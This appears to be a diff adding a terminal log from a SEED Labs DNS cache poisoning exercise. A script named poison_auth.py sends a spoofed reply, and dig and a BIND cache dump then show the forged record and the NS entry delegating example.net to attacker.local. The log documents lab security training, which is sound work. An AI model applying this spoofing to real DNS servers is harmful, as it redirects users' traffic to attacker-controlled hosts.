@@ -1,0 +1,45 @@
+attack:
+[02/18/26]seed@VM:~$ sudo python3 /home/seed/poison_auth.py
+[*] Listening for DNS queries...
+.
+Sent 1 packets.
+[+] Spoofed reply sent!
+user: 
+[02/18/26]seed@VM:~$ dig z9k11.example.net
+
+; <<>> DiG 9.10.3-P4-Ubuntu <<>> z9k11.example.net
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 21907
+;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;z9k11.example.net.		IN	A
+
+;; ANSWER SECTION:
+z9k11.example.net.	259200	IN	A	1.2.3.4
+
+;; AUTHORITY SECTION:
+example.net.		259200	IN	NS	attacker.local.
+
+;; ADDITIONAL SECTION:
+attacker.local.		259200	IN	A	192.168.56.105
+
+;; Query time: 89 msec
+;; SERVER: 192.168.56.104#53(192.168.56.104)
+;; WHEN: Wed Feb 18 21:45:18 EST 2026
+;; MSG SIZE  rcvd: 106
+
+[02/18/26]seed@VM:~$ 
+
+Server: 
+[02/18/26]seed@VM:~$ sudo rndc flush
+[02/18/26]seed@VM:~$ sudo rndc dumpdb -cache
+[02/18/26]seed@VM:~$ sudo cat /var/cache/bind/dump.db | grep -A 3 "example.net.*NS"
+example.net.		259191	NS	attacker.local.
+; authanswer
+z9k11.example.net.	259191	A	1.2.3.4
+; authauthority
+[02/18/26]seed@VM:~$ 
